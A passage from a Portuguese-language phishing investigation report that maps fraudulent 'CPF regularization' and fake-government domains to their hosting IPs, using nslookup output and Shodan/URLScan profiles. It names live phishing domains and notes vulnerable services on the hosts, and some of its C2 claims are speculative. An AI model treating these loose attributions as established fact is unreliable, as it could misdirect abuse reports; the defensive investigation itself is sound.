| **Certificados SSL** | Todos emitidos por **Sectigo** com validade de 1 ano (2025‑2026). Não há indícios de comprometimento na cadeia, mas a presença de HTTPS não impede abuso de conteúdo. |
| **Abuse contacts** (ARIN) | EIG‑Abuse Mitigation (email ``IARPOC@Newfold.com``) e NOC da Unified Layer (email ``abuse@bluehost.com``). Estes contatos podem ser acionados para reporte de abuso. |

**Padrão de uso**: o IP funciona como um *multi‑tenant* de hospedagem barata (possivelmente ambiente **cPanel/WHM** compartilhado). Atacantes aproveitam a baixa fricção de criação de contas para hospedar páginas de phishing ou redirecionamentos maliciosos, enquanto tiram proveito de serviços de gerenciamento (SSH, FTP) que permanecem abertos e desatualizados.

A análise conclui que o servidor de uso do IP, possui inúmeros serviços ativos, com atenção especial para serviços de email, e banco de dados, além de, estar associado há outros inúmeros domínios utilizados para campanhas phishing, sugerindo ser centro de comando e controle das campanhas phishing.
O uso de serviços legados, com várias vulnerabilidades conhecidas, demonstram possível falta de conhecimento em infraestrutura de segurança pelo grupo do golpe, embora, demonstrem uma arquitetura de design, hospedagem e direcionamento de sites sofitiscados.

# 17- Análise de Domínios Suspeitos

Após a análise automatizada, a busca manual pelo ``urlscan.io``, forneceu vários domínios suspeitos associados ao IP, associados aos seguintes IPs quando realizado ``nslookup`` e ``ping``:

* ``centralregularize.com`` -> ``161.35.50.50``
* ``blackconviteplus.com`` -> fora do ar
* ``regularizandocpf.com`` -> ``216.238.109.50``
* ``conviteblackelite.com`` -> ``191.252.227.30``
* ``blackconviteexclusivo.com`` -> ``191.252.227.30``
* ``blackconvitevip.com`` -> ``191.252.225.147``
* ``rendaverificada.com`` -> ``216.238.109.50``
* ``centralregularizacao.com`` -> ``191.252.225.147``
* ``portalregularizacao.com`` -> ``216.238.109.50``
* ``regularizesuadivida.com`` -> ``216.238.109.50``
* ``www.legalizarcpfonline.com`` -> ``216.238.108.222``
* ``simplificandoeorganizandosuasfinancaspessoais.store`` -> fora do ar
* ``alertarct-431107602190.southamerica-east1.run.app`` -> ``34.143.7x.2``
* ``regularize-709035289742.southamerica-east1.run.app`` -> ``34.143.7x.2``
* ``nsm-709035289742.northamerica-south1.run.app`` -> ``34.143.7x.2``
* ``segu-ran-ca-709035289742.southamerica-east1.run.app`` - > ``34.143.7x.2``

```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup centralregularize.com                            
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   centralregularize.com
Address: 161.35.50.50

┌──(kali㉿kali)-[~]
└─$ nslookup blackconviteplus.com 
Server:         192.168.192.2
Address:        192.168.192.2#53

** "server can't find blackconviteplus.com: NXDOMAIN"

┌──(kali㉿kali)-[~]
└─$ nslookup regularizandocpf.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   regularizandocpf.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup conviteblackelite.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   conviteblackelite.com
Address: 191.252.227.30

┌──(kali㉿kali)-[~]
└─$ nslookup blackconviteexclusivo.com                    
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   blackconviteexclusivo.com
Address: 191.252.227.30

┌──(kali㉿kali)-[~]
└─$ nslookup blackconvitevip.com      
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   blackconvitevip.com
Address: 191.252.225.147

┌──(kali㉿kali)-[~]
└─$ nslookup rendaverificada.com                   
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   rendaverificada.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup centralregularizacao.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   centralregularizacao.com
Address: 191.252.225.147

┌──(kali㉿kali)-[~]
└─$ nslookup portalregularizacao.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   portalregularizacao.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup regularizesuadivida.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   regularizesuadivida.com
Address: 216.238.109.50

┌──(kali㉿kali)-[~]
└─$ nslookup legalizarcpfonline.com 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   legalizarcpfonline.com
Address: 216.238.108.222

┌──(kali㉿kali)-[~]
└─$ nslookup simplificandoeorganizandosuasfinancaspessoais.store
Server:         192.168.192.2
Address:        192.168.192.2#53

** "server can't find simplificandoeorganizandosuasfinancaspessoais.store: NXDOMAIN"

┌──(kali㉿kali)-[~]
└─$ nslookup regularize-709035289742.southamerica-east1.run.app 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
regularize-709035289742.southamerica-east1.run.app      canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 2600:1900:4244:200::
Name:   v2.run.app

┌──(kali㉿kali)-[~]
└─$ nslookup alertarct-431107602190.southamerica-east1.run.app 
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
alertarct-431107602190.southamerica-east1.run.app       canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.76.2
                                                                     
┌──(kali㉿kali)-[~]
└─$ nslookup nsm-709035289742.northamerica-south1.run.app     
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
nsm-709035289742.northamerica-south1.run.app    canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.75.2

                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nslookup segu-ran-ca-709035289742.southamerica-east1.run.app
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
segu-ran-ca-709035289742.southamerica-east1.run.app     canonical name = v2.run.app.
Name:   v2.run.app
Address: 34.143.73.2
Name:   v2.run.app
Address: 34.143.78.2
Name:   v2.run.app
Address: 34.143.75.2
Name:   v2.run.app
Address: 34.143.76.2
Name:   v2.run.app
Address: 34.143.72.2
Name:   v2.run.app
Address: 34.143.77.2
Name:   v2.run.app
Address: 34.143.79.2
Name:   v2.run.app
Address: 34.143.74.2
Name:   v2.run.app
Address: 2600:1900:4242:200::
Name:   v2.run.app
Address: 2600:1901:81d4:200::
Name:   v2.run.app
Address: 2600:1900:4241:200::
Name:   v2.run.app
Address: 2600:1900:4245:200::
Name:   v2.run.app
Address: 2600:1900:4240:200::
Name:   v2.run.app
Address: 2600:1900:4243:200::
Name:   v2.run.app
Address: 2600:1901:81d5:200::
Name:   v2.run.app
Address: 2600:1900:4244:200::
```

Em resumo, os IPs associados aos domínios suspeitos foram:
* ``161.35.50.50`` 
* ``216.238.109.50`` 
* ``191.252.227.30`` 
* ``191.252.225.147`` 
* ``216.238.108.222`` 
* ``34.143.7x.2``

O IP ``34.143.7x.2`` já analisado anteriormente, fazendo parte do bloco de IPs de serviço da Google Cloud, evidenciando apresença de vários serviços hispedados e ativos por essa via de hospedagem e distribuição.
A análise revelou também, o uso de mesmo IP para vários domínios diferentes, além de todos, não passarem de 5 meses de registro segundo o ``urlscan.io``. 

# 18- Análise de IPs encontrados

A análise dos IPs, foi realizada de forma automatizada pelo ``ip-analysis.py``.

## ``161.35.50.50`` 

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|---------------|
| **Shodan – Tags** | `cloud` | Indica que o host está em infraestrutura de nuvem (DigitalOcean). |
| **Shodan – Última vez visto** | 2025‑10‑27 | O host está ativo recentemente. |
| **Portas abertas** | 22, 80, 443 | Serviços SSH e Web (HTTP/HTTPS) expostos ao público. |
| **Banner SSH** | OpenSSH 9.6p1 (Ubuntu) | Versão atual, sem vulnerabilidades conhecidas críticas. |
| **Banner HTTP** | Apache 2.4.58 (Ubuntu) | Versão antiga, com várias CVEs (lista abaixo). |
| **Domínio / Hostname** | convitecenturion.com – blog de cafés | Uso aparente como site institucional/pessoal, sem indício direto de atividade maliciosa. |
| **URLScan.io** | Nenhum resultado | Não há evidência de interações suspeitas capturadas por URLScan. |
| **Abuse contacts** (ARIN) | abuse@digitalocean.com | Canal oficial de relato de abuso disponível. |

**Conclusão comportamental:**  
- Não há sinais explícitos de que o IP esteja operando como **C2**, **botnet**, ou **scanner de rede**.  
- O risco principal decorre da **exposição pública de serviços** (SSH, HTTP/HTTPS) e da **presença de múltiplas vulnerabilidades** no servidor Apache, que podem ser exploradas por atores maliciosos para comprometimento do host ou para usá‑lo como **ponto de apoio** em campanhas de ataque.
O endereço **161.35.50.50** pertence à DigitalOcean (ASN **AS14061**) e está localizado em **North Bergen, New Jersey, EUA**. O host resolve para ``convitecenturion.com``, um site de blog que utiliza **Apache httpd 2.4.58** (Ubuntu) nas portas **80 (HTTP)** e **443 (HTTPS)**, além de **OpenSSH 9.6p1** na porta **22 (SSH)**. O serviço web apresenta mais de **30 CVEs** associados à versão do Apache, incluindo vulnerabilidades críticas (CVSS ≥ 9). Não há indicadores claros de que o IP faça parte de botnets ou de atividades de scanner; entretanto, a presença de um servidor exposto com várias vulnerabilidades pode torná‑lo um alvo atraente para exploração ou para uso como ponto de pivotagem.  

A análise, embora não tenha observado comportamentos maliciosos, possui serviços ativos de ``SSH`` e ``HTTP/HTTPS``, o que sugere seu uso para hospedagem de páginas somente, e possivelmente, pelos serviços ativos, ponto de apoio para realização de atividades ofensivas contra as vítimas através .
O IP direciona para o domínio ``convitecenturion.com``, sendo um domínio com página confiável, porém, que aponta para outro IP ao ser analisado pelo ``nslookup``, evidenciamento mais um sistema de direcionamento e ``cloacking``, demonstrando o comportamento malicioso, e mais uma vez, a arquitetura sofisticada das campanhas phishing realizadas pelo grupo de golpistas.

```bash
┌──(kali㉿kali)-[~]
└─$ nslookup convitecenturion.com
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   convitecenturion.com
Address: 172.233.6.193
```

## ``216.238.109.50``

**Análise de Comportamento**
| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Tags Shodan** | `cloud`, `vpn` | Hospedado em nuvem e oferece serviço VPN – uso legítimo ou para mascaramento de atividades maliciosas. |
| **Porta 500/UDP (IKE VPN)** | Payload IKE exibido, sem criptografia | Indica um serviço de VPN ativo, possivelmente usado para **túnel de tráfego malicioso** ou para ocultar a origem de ataques. |
| **Porta 22/SSH aberta** | OpenSSH 7.6p1, banner público | Facilidade de acesso remoto; pode ser alvo de **brute‑force** ou já estar comprometido como ponto de comando e controle (C2). |
| **Portas 80/443 HTTP(S)** | Resposta 404 em 80; HTTPS ativo nos domínios investigados | Hospedagem de múltiplos sites de aparência fraudulenta (phishing/ scams). |
| **Domínios de curto prazo** | Idade entre 0‑14 dias, conteúdo de “regularização” de documentos | Estratégia típica de **phishing**: registrar rapidamente domínios, usar certificados válidos (TLS 89 dias) para ganhar confiança. |
| **Ausência de CVEs listadas** | Shodan não mostrou vulnerabilidades específicas | Não há vulnerabilidades expostas diretamente, mas o software (OpenSSH 7.6p1) tem CVEs conhecidos (ex.: CVE‑2018‑15473, CVE‑2020‑15778). |
| **Presença em feeds de ameaças** | Não fornecido, porém tags e comportamento sugerem inclusão em listas de **abuse** de nuvem. | Recomenda‑se verificação em fontes externas (AbuseIPDB, Spamhaus, etc.). |

**Conclusão comportamental:** O IP funciona como **infraestrutura de hospedagem de sites fraudulentos** e oferece serviços VPN/SSH que podem ser utilizados para **túnel e controle remoto**. Não há evidência direta de ser parte de um botnet conhecido, mas o conjunto de serviços e a natureza dos domínios apontam para uso malicioso.
O endereço **216.238.109.50** pertence à nuvem da **Vultr** (ASN AS20473 – The Constant Company, LLC) e está localizado em **Osasco, São Paulo, Brasil**. O host apresenta as portas **22 (SSH), 80 (HTTP), 443 (HTTPS), 500 (UDP – IKE VPN) e 7011 (TCP – serviço não identificado)**. Os banners revelam um servidor **OpenSSH 7.6p1** e um túnel VPN IKE ativo.  
Diversos domínios de **curto tempo de vida** (ex.: `regularizandocpf.com`, `rendaverificada.com`, `centralregularizacao.com`) apontam para este IP, todos exibindo páginas em português com aparência de sites de “regularização” de CPF, renda, etc., tipicamente associadas a **phishing e fraudes financeiras**. As tags do Shodan (“cloud”, “vpn”) reforçam a natureza de hospedeiro de serviços VPN e web. Não foram encontradas vulnerabilidades CVE explícitas no relatório, porém o OpenSSH 7.6p1 possui vulnerabilidades conhecidas.

A análise, revela ser um IP de servidor reconhecido para atividades maliciosas, podendo ser usado como ponto de comando e controle por coleta de tráfego via túnel VPN, presente como serviço ativo no servidor. A análise também evidenciou a presença de uma porta alta aberta ``7011``, desmonstrando comportamento suspeito de execução de serviços de comunicação com máquinas das vítimas.  

## ``191.252.227.30``

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|----------------|
| **Shodan** | Página de erro “404: Not Found” – nenhuma ficha de serviço. | O Scanning do Shodan não obteve banners; porém a ausência de dados não indica inexistência de serviços. |
| **URLScan.io** | 5 varreduras mostrando 5 domínios diferentes (ex.: `blackconviteplus.com`, `conviteblackelite.com`, `blackconviteexclusivo.com`). Todos apontam ao mesmo IP, com certificado TLS recém‑emitido (≈ 90 dias) e content‑type HTML. | Indica que o IP hospeda múltiplos domínios de curta vida – padrão de “fast‑flux” ou serviços de hospedagem de páginas de phishing/ scams. |
| **Domínios** | Todos os domínios apresentam **título** “Giovani e Adenir Oliveira: da terra ao seu paladar — Blog Veroo Cafés”. | Pode ser tentativa de camuflagem usando conteúdo aparentemente legítimo, mas a correlação com termos “convite”, “black” sugere campanha de engodo. |
| **Serviços detectados** | Servidor Apache 2.4.52 (Ubuntu) nas portas 80/443. | Servidor web padrão, mas a versão Apache 2.4.52 já tem vulnerabilidades conhecidas; embora não haja CVEs listados pelo Shodan, a presença de um software amplo pode facilitar exploração. |
| **Certificado TLS** | Emissor “R13”, validade 89‑90 dias, emitido recentemente (03‑10‑2025). | Certificado provavelmente de Let's Encrypt (R13 = “R3”?), típico de automação de certificados em ambientes de hospedagem rápida. |
| **ASN / ISP** | AS27715 – Locaweb Serviços de Internet S/A. | Provedor de hospedagem brasileiro de uso geral; a presença de atividades suspeitas pode estar relacionada a clientes mal‑intencionados ou a comprometimento de um servidor dentro da rede. |

**Conclusão comportamental:** Não há evidência direta de botnet de C2, mas o padrão de múltiplos domínios curtos, conteúdos de blog genéricos e uso de TLS recente são indicadores típicos de infraestrutura de phishing/ scam. O IP pode estar sendo usado como *phishing landing page* ou para hospedar *malvertising*.
O endereço **191.252.227.30** pertence à Locaweb Serviços de Internet S/A (AS27715) e está localizado em São Paulo, BR. Embora o Shodan não retorne informações de serviços (apresenta “404: Not Found”), o URLScan.io identifica este IP como backend de múltiplos domínios recém‑criados (e com idade de 0 dias) que exibem o mesmo site de aparência legítima (blog “Veroo Cafés”), porém os nomes (ex.: *blackconviteplus.com*, *conviteblackelite.com*, *blackconviteexclusivo.com*) são típicos de campanhas de phishing ou de “convite” fraudulento. O servidor responde nas portas **80 / 443** (Apache 2.4.52 em Ubuntu) e utiliza certificado TLS válido (≈ 90 dias). Não foram encontrados CVEs associados ao host via Shodan. O conjunto de indicadores sugere possível uso do IP para hospedagem de sites de engodo ou de phishing, possivelmente como parte de botnet de hospedagem de conteúdo malicioso.

Análise retornou de forma clara, mais um IP de servidor de sites maliciosos, sem retorno de serviços por estar inacessível pelo scan do ``shodan.io``, o que demonstra, ser somente utilizado para hospedagem de páginas pelo ``Localweb``.

## ``191.252.225.147``

Análise de Comportamento
| Evidência | Interpretação |
|-----------|----------------|
| **Múltiplas hostnames** (`batamwebmedia.com`, `vpscl3417.publiccloud.com.br`) e **diversas zonas** (`centralregularize.com`, `blackconvitevip.com`, `conviteblackvip.com`, `conviteblackexclusivo.com`) apontando para o mesmo IP | **Fast‑flux / painel de controle de hospedagem** que permite a criação rápida de domínios de phishing ou spam. |
| **Domínios com “age” de 0‑1 dia** (URLScan.io) e **tags “suspect”** | Probabilidade alta de **campanhas de phishing, scams ou sites de afiliados maliciosos**. |
| **Porta 25 aberta com STARTTLS** e **banner Postfix** sem restrição explícita de relay | Possível **relay de spam** ou **uso como ponto de saída para botnet**. |
| **Porta 22 aberta** (OpenSSH) | Vetor comum para **ataques de força‑bruta / comprometimento de credenciais**. |
| **Apache 2.4.52** com inúmeras CVEs (vários críticos, high e medium) | **Superfície de ataque extensa**; vulnerabilidades conhecidas podem ser exploradas para RCE, SSRF, hijacking de sessão ou negação de serviço. |
| **Certificado Let's Encrypt válido 89 dias** (para `batamwebmedia.com`) e **certificado self‑signed** no banner SMTP | Indica **configurações mistas** que podem ser usadas para mascarar tráfego malicioso. |
| **Tags Shodan – “self‑signed”, “starttls”** | Sinal de **serviços mal configurados** (pode facilitar interceptação ou spoofing). |
| **Último visto 2025‑10‑08** (atividade recente) | O host está **ativo e em operação** no momento da coleta. |

**Conclusão comportamental:**  
O IP demonstra um perfil típico de **infraestrutura de hospedagem utilizada por atores maliciosos** para distribuir sites de curta vida, possibilitar envio de e‑mail em massa e servir como ponto de acesso para exploração de vulnerabilidades web.
O endereço **191.252.225.147** está alocado à **Locaweb Serviços de Internet S/A (AS27715)**, localizado em **São Paulo – Brasil**. O host apresenta as portas **22 (SSH), 25 (SMTP), 80 (HTTP) e 443 (HTTPS)** expostas, rodando **OpenSSH 8.9p1 (Ubuntu)**, **Postfix smtpd** e **Apache httpd 2.4.52 (Ubuntu)**.  
Várias domíções recém‑criadas (ex.: `centralregularize.com`, `blackconvitevip.com`, `conviteblackvip.com`) apontam para esse IP, todas exibindo um mesmo conteúdo de blog (potencialmente usado como fachada).  
O serviço Apache contém **mais de 30 vulnerabilidades** (incluindo CVEs críticos como CVE‑2024‑38476 – CVSS 9.8) e a configuração de SMTP permite STARTTLS, mas não há evidência de restrição de relay.  
Indicadores de uso malicioso: domínio de vida útil ≤ 1 dia, múltiplos domínios “suspect”, serviços de mail abertos e presença de tags **self‑signed** e **starttls** no Shodan.  

```bash
┌──(kali㉿kali)-[~]
└─$ nslookup batamwebmedia.com       
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   batamwebmedia.com
Address: 191.252.225.147
```

Análise retornou de forma clara, mais um IP de servidor de sites maliciosos, com serviço ``SMTP`` com ``STARTTLS``, sugerindo aervidor de ``botnets`` de envio de emails phishing.
A análise, retornou também, uso de certificado para domínio ``batamwebmedia.com`` no banner do serviço ``SMTP``, confirmando sua correspondência através de ``nslookup``. 
Uma rápida análise via ``whois.com``, apontou para o registro do domínio pelo ``Hostinger``, com dados de contato do proprietário ocultados, sendo exibidos o do servidor da hospedagem do domínio (``Hostinger``). O uso desse domínio, sugere possível uso para mascarar o tráfego, podendo esse, estar sendo utilizado por possível má configuração de DKIM/DMARK/SPF.

## ``216.238.108.222``

Análise de Comportamento
| Fonte | Indicador | Interpretação |
|-------|-----------|---------------|
| **Shodan** | Tags: `cloud`, hostnames `*.vultrusercontent.com` | Servidor em nuvem pública, tipicamente usado por infraestruturas legítimas, mas também por atores maliciosos que buscam anonimato rápido. |
| **Shodan – Portas** | 443 (HTTPS) & 8082 (HTTP) – ambos Nginx | Serviços web abertos. 8082 responde com *400 Bad Request* ao HTTP puro, possivelmente um endpoint de API ou painel interno exposto. |
| **URLScan.io** | 5 domínios analisados apontam ao mesmo IP, todos marcados como “suspect”. Títulos falsificam autoridades brasileiras (DETRAN, Receita Federal). | Indicação clara de **phishing** e **fraude online**. O IP age como hospedagem de landing pages enganosas. |
| **Whois / RDAP** | Organização: *Vultr Holdings, LLC* (provedor de cloud). | Não há vínculo direto com atividade criminosa, porém a natureza de VPS permite rotatividade e uso temporário por atores maliciosos. |
| **Histórico de varredura** | Último visto em 2025‑10‑09 | O IP está ativo recentemente, mantendo os serviços expostos. |

**Conclusão de comportamento:** Não há sinais de botnet ou C2 (não foram observados tráfego de comando/controle ou portas típicas de P2P). Contudo, a **presença de múltiplos sites fraudulentos** indica que o servidor está sendo usado como **plataforma de hospedagem de phishing** e possivelmente distribuição de payloads maliciosos via download de arquivos ou scripts maliciosos.
O endereço **216.238.108.222** está localizado em **Osasco, São Paulo, Brasil**, pertencente ao provedor de nuvem **Vultr** (ASN **AS20473 – The Constant Company, LLC**). O host possui duas portas abertas (**443/tcp** e **8082/tcp**) servindo **Nginx**. Evidências de **atividade maliciosa** foram encontradas nas análises de URLScan.io, que mostram o IP sendo utilizado como backend de múltiplos domínios suspeitos de phishing e fraude (ex.: *regularizemultas.com*, *legalizarcpfonline.com*), todos com conteúdo falsificando órgãos públicos (DETRAN, Receita Federal). Não foram identificadas vulnerabilidades CVE diretamente associadas ao serviço Nginx exposto, mas a presença de um servidor web público sem restrições e seu uso para hospedagem de sites fraudulentos indica **alto risco de ser usado como vetor de ataque** (phishing, distribuição de malware, hospedagem de payloads).

A análise, evidenciando mais um IP direcionado à servidor de hospedagem de sites com serviços ``HTTP``, ``HTTPS`` e outros servidos via ``Nginx`` nas portas ``443`` e ``8082``, de múltiplos domínios analisados apontados ao mesmo IP, todos marcados como “suspect”, com títulos de falsificação autoridades brasileiras (DETRAN, Receita Federal), indicando também, servir de servidor para ``landing pages`` maliciosas.




